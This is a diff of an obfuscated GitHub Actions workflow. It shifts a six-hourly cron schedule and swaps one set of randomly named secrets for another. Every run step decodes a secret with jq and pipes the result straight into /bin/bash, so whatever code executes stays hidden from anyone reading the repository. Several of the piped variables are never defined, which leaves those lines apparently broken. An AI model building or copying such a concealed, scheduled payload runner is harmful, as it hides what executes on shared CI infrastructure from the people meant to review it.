@@ -2,7 +2,8 @@ name: mufuya3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 1/6 * * *'
+    - cron: '21 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,14 +11,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: mufuya3456
         env:
-          qc4607: ${{ secrets.qc4607 }}
+          n63123: ${{ secrets.n63123 }}
         run: |
-          echo $qc4607 | jq -r .l309 | /bin/bash
-          echo $tmiw97 | jq -r .dov33208 | /bin/bash
-          echo $hjehr99886 | jq -r .fti86 | /bin/bash
-          echo $cje04 | jq -r .jcb78069 | /bin/bash
-          echo $m9 | jq -r .jdf621 | /bin/bash
-          echo $qgcq3 | jq -r .petuv98149 | /bin/bash
-          echo $kzneb56206 | jq -r .ifo7084 | /bin/bash
-          echo $jfaa609 | jq -r .but8 | /bin/bash
+          echo $n63123 | jq -r .yyyhy01 | /bin/bash
+          echo $u569 | jq -r .vjb9 | /bin/bash
+          echo $afj63835 | jq -r .psg84889 | /bin/bash
 
